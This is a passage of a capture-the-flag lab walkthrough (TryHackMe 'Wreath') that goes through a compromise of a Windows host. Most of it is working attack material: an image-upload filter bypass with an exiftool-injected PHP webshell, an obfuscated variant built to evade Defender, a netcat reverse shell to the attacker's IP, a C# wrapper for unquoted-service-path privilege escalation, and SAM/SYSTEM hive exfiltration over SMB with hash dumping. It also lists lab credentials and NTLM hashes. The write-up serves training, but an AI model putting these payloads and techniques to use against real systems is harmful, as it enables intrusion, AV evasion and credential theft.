                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }


        if(isset($_GET["msg"])){
                $msg = $_GET["msg"];
                switch ($msg) {
                        case "Success":
                                $res = "File uploaded successfully!";
                                break;
                        case "Fail":
                                $res = "Invalid File Type";
                                break;
                        case "Exists":
                                $res = "File already exists";
                                break;
                        case "Method":
                                $res = "No file send";
                                break;

                }
        }
?>
<!DOCTYPE html>
<html lang=en>
        <!-- ToDo:
                  - Finish the styling: it looks awful
                  - Get Ruby more food. Greedy animal is going through it too fast
                  - Upgrade the filter on this page. Can't rely on basic auth for everything
                  - Phone Mrs Walker about the neighbourhood watch meetings
        -->
        <head>
                <title>Ruby Pictures</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
                <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
        </head>
        <body>
                <main>
                        <h1>Welcome Thomas!</h1>
                        <h2>Ruby Image Upload Page</h2>
                        <form method="post" enctype="multipart/form-data">
                                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
                                <input type="submit" name="upload" id="fileSubmit" value="Upload">
                        </form>
                        <p id=res><?php if (isset($res)){ echo $res; };?></p>
                </main>
        </body>
</html>
```

Interesting part is the filters here
```php
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

This line has `getimagesize` method that checks if image has dimensions - returns `False` if file is not an image
```php
$size = getimagesize($_FILES["file"]["tmp_name"]);
```

This line checks for two conditions, if either fails, we get error message.
- Second condition checks if the file is not an image
- First condition split string by `.` into an array and checks second item
  - `image.jpeg` returns `["image", "jpeg"]`
  - But `image.jpeg.php` returns `["image","jpeg","php"]` and `jpeg` gets passed into the filter
  - This filter then checks if it is not in the array of `$goodExts`

After two conditions pass, the file gets moved into `uploads/` directory with original name
```php
$target = "uploads/".basename($_FILES["file"]["name"]);
```

</details>

## 24. Personal PC - Exploit PoC

<details>
  <summary>---</summary>

What we know
- We probably need creds
- We can upload image files
- There are two filters to stop uploading non image files
- Both filters can be bypassed

We know there is a `/resources` directory
```
kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ ls
commit-meta.txt  css  favicon.png  fonts  img  index.html  js  resources
```

To access the personal website again we need to set up chisel

Attacking machine sshuttle tunnel through webserver .200 to gitserver .150
```
kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200
[local sudo] Password: 
c : Connected to server.
```

Attacking machine chisel client
```
kali@kali:~/thm/wreath$ chisel client 10.200.85.150:34999 9090:socks
2021/04/23 09:11:32 client: Connecting to ws://10.200.85.150:34999
2021/04/23 09:11:32 client: tun: proxy#127.0.0.1:9090=>socks: Listening
2021/04/23 09:12:17 client: Connection error: dial tcp 10.200.85.150:34999: i/o timeout
2021/04/23 09:12:17 client: Retrying in 100ms...
2021/04/23 09:13:02 client: Connection error: dial tcp 10.200.85.150:34999: i/o timeout (Attempt: 1)
2021/04/23 09:13:02 client: Retrying in 200ms...
2021/04/23 09:13:36 client: Connected (Latency 280.663103ms)
```

evil-winrm into gitserver and start chisel server
```
kali@kali:~/thm/wreath$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> c:\windows\tmp\chisel-Neozer0.exe server -p 34999 --socks5
chisel-Neozer0.exe : 2021/04/23 14:13:18 server: Fingerprint Ft4a8p6iIo7CNEF3v94jGufjy/gngH9Ym8/xlC8Fta0=
    + CategoryInfo          : NotSpecified: (2021/04/23 14:1...H9Ym8/xlC8Fta0=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2021/04/23 14:13:18 server: Listening on http://0.0.0.0:349992021/04/23 14:13:35 server: session#1: Client version (0.0.0-src) differs from server version (1.7.6)
```

Finally we can visit `http://10.200.85.100/resources` where we are greeted with a login prompt

![login prompt](./resources.png)

Try Thomas' hash that we cracked earlier

User: Thomas
Password: i<3ruby

.. And we're in

Upload a normal jpg file and access it through `/resources/uploads/FILE.jpg`

Upload success
![upload success](./uploadsuccess.png)

And we see our image
![upload access](./uploadaccess.png)

Now to upload an exploit to get webshell. We need to bypass the two filters
1. The file extension can be bypassed with `.jpeg.php`
2. The image size will require an actual image with shell injected in the exifdata, specifically the `Comment` field
   
Take a regular image and rename it with `.jpeg.php` extension

Run `exiftool` on the image
```
kali@kali:~/thm/wreath$ exiftool test-Neozer0.jpeg.php 
ExifTool Version Number         : 12.16
File Name                       : test-Neozer0.jpeg.php
Directory                       : .
File Size                       : 45 KiB
File Modification Date/Time     : 2021:04:23 09:30:57-04:00
File Access Date/Time           : 2021:04:23 09:30:57-04:00
File Inode Change Date/Time     : 2021:04:23 09:30:57-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 750
Image Height                    : 750
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 750x750
Megapixels                      : 0.562
```

There is also AV installed on this target. It may detect any default PHP webshell uploaded and alert the victim. The first step then is to create a proof of concept before we can work out an AV bypass.

Harmess PHP payload - `<?php echo "<pre>Test Payload</pre>"; die();?>` 

We add this to the image with exiftool
```
kali@kali:~/thm/wreath$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-Neozer0.jpeg.php
    1 image files updated
kali@kali:~/thm/wreath$ exiftool test-Neozer0.jpeg.php ExifTool Version Number         : 12.16
File Name                       : test-Neozer0.jpeg.php
Directory                       : .
File Size                       : 45 KiB
File Modification Date/Time     : 2021:04:23 09:35:37-04:00
File Access Date/Time           : 2021:04:23 09:35:37-04:00
File Inode Change Date/Time     : 2021:04:23 09:35:37-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
Image Width                     : 750
Image Height                    : 750
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 750x750
Megapixels                      : 0.562
```

Now we upload this benign payload and access it on the browser to see that the test payload has worked and we are able to execute PHP code on the system!

![upload poc](./uploadpoc.png)

</details>

## 25. AV Evasion - Intro and Methods

<details>
  <summary>---</summary>

### Introduction

There is a constant change in this topic. New features by deveopers, new exploit developed by hackers etc.

Two primary types of AV evasion
1. On-disk evasion
     - Try to get a file saved on the target, then executed (`.exe` files)
2. In-memory evasion
     - Try import a script directly into memory and executed
     - Eg. Downloading PowerShell module and directly importing it without saving to disk

Microsoft's Anti Malware Scan Interface (AMSI) can pick up in memory scripts now. AV can obtain copy of script being executed, scan it, decides ifi t is safe to execute

Methodology of AV evasion is to fingerprint the AV first. Could be Social Engineering or other techniques.

If we have shell on target, `SharpEDRChecker` and `Seatbelt` can identify AV solution. Once this is known, we can replicate this environment in a virtual machine and test the payload against it. Also consider disconnect VM from the internet so that AV doesn't upload our payload to a server somewhere for analysis.

AV evasion also involves obfuscation of the payload
- Moving things around in the exploit
- Changing variable names
- Encoding parts of the scripts
- Encrypting the script and writing a wrapper to decrypt and execute code section by section

### AV detection methods

1. Static Detection
    - Signature detection 
      - Hashsum (easily evaded)
      - Byte (or string) matching (slower)
2. Dynamic / Heuristic / Behavioural Detection
    - More effective but more time and resource consumption
    - Looks at how the file acts - two ways
    1. Look at executable line by line. Determine if malicious based on type of action
    2. Execute software in a sandbox environment under close supervision

Evading Sandbox environment detection method:
- no fan, no GUI, VMtools service running
- exiting if detect these characteristics - cause AV to believe that this program is harmless

Evading by password protecting
- AV unable to open the file

AV vendors are also in close contact with each other. Once detected, file is sent and analysed by another vendor and shielded against. The knowledge is rapidly shared

</details>

## 26. AV Evasion - PHP payload obfuscation

<details>
  <summary>---</summary>

Given that we know the AV used on the PC is Windows Defender (preinstalled with Windows Server):
  - We build payload in a slightly less common way
  - We obfuscate manually or using a tool online

Payload:
```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

This payload:
- Checks if `GET` parameter called `wreath` has been set
- If set, `shell_exec()` executes (lives in `<pre>` tag for clean output)
- Use `die()` to prevent rest of garble text from image showing up

This is slighly longer than the standard `<?php system($_GET["cmd"]);?>` because
- Obfuscating will become one liner anyway
- Being different is good for AV evasion

With the payload, we now obfuscate it by:
- Switch parts of exploit around so they are in unusual order
- Encoding all the strings
- Splitting up distinctive parts of the code (eg. `shell_exec($_GET[...])`)

Here we use online [php obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) with all obfuscation options set and we get:
```php
<?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
```

The payload will need some escaping because `$` will be interpreted as bash variables

`<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>`

Make a new copy of the image and inject our new payload
```
kali@kali:~/thm/wreath$ cp ~/Downloads/corg.jpg ./shell-Neozer0.jpeg.php
kali@kali:~/thm/wreath$ exiftool -Comment="<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>" shell-Neozer0.jpeg.php 
    1 image files updated
kali@kali:~/thm/wreath$ exiftool shell-Neozer0.jpeg.php
ExifTool Version Number         : 12.16
File Name                       : shell-Neozer0.jpeg.php
Directory                       : .
File Size                       : 46 KiB
File Modification Date/Time     : 2021:04:24 08:24:07-04:00
File Access Date/Time           : 2021:04:24 08:24:07-04:00
File Inode Change Date/Time     : 2021:04:24 08:24:07-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
Image Width                     : 750
Image Height                    : 750
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 750x750
Megapixels                      : 0.562
```

Visiting the page we get

![upload success](phpshell.png)

Where we can execute command with param `wreath`

![run systeminfo](phpshellsysinfo.png)

</details>


## 27. AV Evasion - compile netcat and get reverse shell

<details>
  <summary>---</summary>

- Webshell is ok but let's upgrade to full reverse shell
- There are less options for Windows to obtain reverse shell compared to Linux
- Options are:
  - Powershell - but Defender can detect this very well
  - PHP reverse shell as there is a PHP interpreter installed - this tends to trigger Defender also
  - Generate executable reverse shell using msfvenom, upload then activate it using webshell. msfvenom shells tend to be distintive. Could try `Veil Framework` to get meterpreter shell executable that might bypass Defender
  - Easiest and quickest way is to upload netcat (netcat for Windows inside Kali is known to defender so we need a variant)

Download netcat variant https://github.com/int0x33/nc.exe/

We upload the `nc.exe` to the target

1. Start http server and 
```
kali@kali:~/code/nc.exe$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.85.100 - - [24/Apr/2021 08:50:59] "GET /nc.exe HTTP/1.1" 200 -

```

2. Run curl command on webshell `curl http://10.50.86.79/nc64.exe -o c:\\windows\\temp\\nc-Neozer0.exe`

![curl nc](curlnc.png)

3. Set up netcat listener
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
listening on [any] 49999 ...

```

4. Run command to start reverse shell - `10.200.85.100/resources/uploads/shell-Neozer0.jpeg.php?wreath=powershell.exe%20c:\\windows\\temp\\nc-Neozer0.exe%2010.50.86.79%2049999%20-e%20cmd.exe`

![nc reverse shell](ncreverseshell.png)

5. Back on netcat listener we get a shell
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
listening on [any] 49999 ...
connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50050
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>

```

</details>

## 28. AV Evasion - Enumeration

<details>
  <summary>---</summary>

Check current privileges
```
C:\xampp\htdocs\resources\uploads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```
C:\xampp\htdocs\resources\uploads>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 
```

```
C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
LSM                                                                                 LSM                                                                                                                                   Unknown    
Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     

```

```
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)
```

</details>

## 29. AV Evasion - Privilege Escalation

<details>
  <summary>---</summary>

Recap:
- We have privilege that could be used to escalate to system permissions. However, we need to obfuscate the exploit to get past Defender
- We have unquoted service path vulnerability for a service running as the system account - `SystemExplorerHelpService`

Exploits for manipulating privilage will need:
- Custom compilation
- Obfuscated

The unquoted service path attack is simpler because:
- Only need small wrapper program that activates netcat already uplaoded
- The executable will send a reverse shell as the owner of the service (local system)
- Ideally written in C# to integrate well with Windows service management system, but this can be done by creating a standalone executable
- In an enterprise AV, this technique may still be detected and require more sophisticated solution

Installing Visual Studio 
- On Linux machine use - `mono` dotnet core compiler
- `sudo apt install mono-devel`
- Create new file

```cs
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
                Process proc = new Process();
                ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-Neozer0.exe", "10.50.86.79 49999 -e cmd.exe");
                procInfo.CreateNoWindow = true;
                proc.StartInfo = procInfo;
                proc.Start();
        }
    }
}
```

- `using System;` and `using System.Diagnostics;` - starts new process
- `namespace Wrapper{` and `class Program{` - creates namespace and class `Program`
- `ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");` - Creates new process start info to set params
- `procInfo.CreateNoWindow = true;` - not create GUI window when starting
- `proc.StartInfo = procInfo;` and `proc.Start();` - attach `ProcessStartInfo` object to the process and starts it

Now we compile the program with Mono `mcs` compiler

```
kali@kali:~/thm/wreath$ mcs Wrapper.cs 
kali@kali:~/thm/wreath$ ls Wrapper*
Wrapper.cs  Wrapper.exe
kali@kali:~/thm/wreath$ file Wrapper.exe 
Wrapper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Upload the file either using python web server or Impacket SMB server

Impacket
- `git clone https://github.com/SecureAuthCorp/impacket`
- `sudo pip3 install -r requirements.txt `

Start smb server on our IP serving a share called `share` in current directory. This is also using SMBv2 for relatively up to date targets
```
kali@kali:~/thm/wreath$ sudo python3 ~/code/impacket/examples/smbserver.py share . -smb2support -username user -password hellotheretaco
Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

In the reverse shell we run
- `net use \\10.50.86.79\share /USER:user hellotheretaco`

```
C:\xampp\htdocs\resources\uploads>net use \\10.50.86.79\share /USER:user hellotheretaco
net use \\10.50.86.79\share /USER:user hellotheretaco
The command completed successfully.


C:\xampp\htdocs\resources\uploads>copy \\10.50.86.79\share\Wrapper.exe %TEMP%\wrapper-Neozer0.exe
copy \\10.50.86.79\share\Wrapper.exe %TEMP%\wrapper-Neozer0.exe
        1 file(s) copied.
```

Share can be stopped with `net use \\ATTACKER_IP\share /del`

We now start another listener and execute
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
listening on [any] 49999 ...
```

```
C:\xampp\htdocs\resources\uploads>"%TEMP%\wrapper-Neozer0.exe"
"%TEMP%\wrapper-Neozer0.exe"
```

```
kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
listening on [any] 49999 ...
connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50512
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>
```

Copy over file to `Program.exe`

`copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"`

```
C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"
copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"
        1 file(s) copied.

C:\xampp\htdocs\resources\uploads>dir "C:\Program Files (x86)\System Explorer\"
dir "C:\Program Files (x86)\System Explorer\"
 Volume in drive C has no label.
 Volume Serial Number is A041-2802

 Directory of C:\Program Files (x86)\System Explorer

25/04/2021  08:58    <DIR>          .
25/04/2021  08:58    <DIR>          ..
22/12/2020  00:55    <DIR>          System Explorer
25/04/2021  08:00             3,584 System.exe
               1 File(s)          3,584 bytes
               3 Dir(s)   6,967,848,960 bytes free
```

Restart service

Stop - `sc stop SystemExplorerHelpService`

Start - `sc start SystemExplorerHelpService`

```
C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
sc stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

And we check on our listener with `root`
``` 
kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
listening on [any] 49999 ...
connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50544
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We also need to clean up
- `del "C:\Program Files (x86)\System Explorer\System.exe"`
- `sc start SystemExplorerHelpService`

```
C:\Windows\system32>del "C:\Program Files (x86)\System Explorer\System.exe"
del "C:\Program Files (x86)\System Explorer\System.exe"

C:\Windows\system32>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3332
        FLAGS              : 

C:\Windows\system32>
```

</details>

## 30. Exfiltration Techniques & Post Exploitation

<details>
  <summary>---</summary>

Exfiltrate hashes

```

C:\Windows\system32>net use \\10.50.86.79\share /USER:user hellotheretaco
net use \\10.50.86.79\share /USER:user hellotheretaco
The command completed successfully.


C:\Windows\system32>reg.exe save HKLM\SAM \\10.50.86.79\share\sam.bak
reg.exe save HKLM\SAM \\10.50.86.79\share\sam.bak
The operation completed successfully.

C:\Windows\system32>reg.exe save HKLM\SYSTEM \\10.50.86.79\share\system.bak 
reg.exe save HKLM\SYSTEM \\10.50.86.79\share\system.bak
The operation completed successfully.

```

Use `Impacket`
```
kali@kali:~/thm/wreath$ ls sam* system*
sam.bak  system.bak

kali@kali:~/thm/wreath$ python3 ~/code/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up... 
```

</details>
